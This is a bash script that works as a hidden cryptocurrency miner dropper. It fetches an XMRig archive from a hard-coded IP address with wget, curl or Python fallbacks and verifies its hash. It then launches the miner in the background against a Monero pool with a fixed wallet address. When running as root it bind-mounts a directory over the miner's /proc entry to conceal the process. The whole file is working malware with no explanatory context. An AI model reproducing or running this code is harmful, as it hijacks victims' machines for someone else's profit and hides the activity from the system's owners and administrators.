#!/bin/bash

REMOTE_SCRIPT_URL="http://123.57.219.71:8008/profile/upload/qrcode/xmrig-6.25.0-linux-static-x64.tar.gz"
WALLET_ADDRESS="4463BC3XZoP2K2wZwFPoQfhB41QpAH5p3SpBmmKcFpKBXfnGd4vx9MhRjnizkg2Q7kdbHwj9zQRJHEsYeLuGCMwNMw8SNFU"
EXPECTED_MD5="cf127d66124c390ca0f0b42c6385c3c8"

LOCAL_SCRIPT="/var/tmp"
LOCAL_SCRIPT_PATH="/var/tmp/xmrig"
HIDE_DIR="/tmp"
POOL_URL="stratum+ssl://auto.c3pool.org:33333"
WORKER_NAME="worker_$(date +%s)"
CPU_THREADS=70


if mount | grep -q 'on /proc/[0-9]'; then
    return 1 2>/dev/null || exit 1
fi

if pgrep -u $(id -u) -f "$WALLET_ADDRESS" >/dev/null; then
    return 1 2>/dev/null || exit 1
fi

if [[ -f "$LOCAL_SCRIPT_PATH" ]]; then
    CALCULATED_MD5=$(md5sum "$LOCAL_SCRIPT_PATH" | cut -d' ' -f1)
    if [[ "$CALCULATED_MD5" != "$EXPECTED_MD5" ]]; then
        rm -rf "$LOCAL_SCRIPT_PATH"
    fi
fi

if [[ ! -f "$LOCAL_SCRIPT_PATH" ]]; then
    if command -v wget &> /dev/null; then
        wget -qO- "$REMOTE_SCRIPT_URL" | tar xz --strip-components=1 -C "$LOCAL_SCRIPT"
    elif command -v curl &> /dev/null; then
        curl -sL "$REMOTE_SCRIPT_URL" | tar -xz --strip-components=1 -C "$LOCAL_SCRIPT"
    elif command -v python3 &> /dev/null || command -v python &> /dev/null || command -v python2 &> /dev/null; then
        (python3 -c "import urllib.request, sys; sys.stdout.buffer.write(urllib.request.urlopen('$REMOTE_SCRIPT_URL').read())" 2>/dev/null || python2 -c "import urllib2, sys; sys.stdout.write(urllib2.urlopen('$REMOTE_SCRIPT_URL').read())" 2>/dev/null || python -c "import urllib2, sys; sys.stdout.write(urllib2.urlopen('$REMOTE_SCRIPT_URL').read())" 2>/dev/null) 2>/dev/null | tar xz --strip-components=1 -C "$LOCAL_SCRIP" 2>/dev/null
    else
        exit 1
    fi
    if [[ ! -f "$LOCAL_SCRIPT_PATH" ]]; then
        return 1 2>/dev/null || exit 1
    fi
    CALCULATED_MD5=$(md5sum "$LOCAL_SCRIPT_PATH" 2>/dev/null | cut -d' ' -f1)
    if [[ "$CALCULATED_MD5" != "$EXPECTED_MD5" ]]; then
        return 1 2>/dev/null || exit 1
    fi
    chmod +x "$LOCAL_SCRIPT_PATH"
fi

(nohup "$LOCAL_SCRIPT_PATH" -o "$POOL_URL" -u "$WALLET_ADDRESS" -p "$WORKER_NAME" --cpu-max-threads-hint="$CPU_THREADS" >/dev/null 2>&1 &) 2>/dev/null

[ "$(id -u)" -eq 0 ] && {
    MINER_PID=$(pgrep -f "xmrig.*$WALLET_ADDRESS" | head -1)
    if [ -n "$MINER_PID" ]; then
        mount -o bind "$HIDE_DIR" "/proc/$MINER_PID" 2>/dev/null
    fi
}
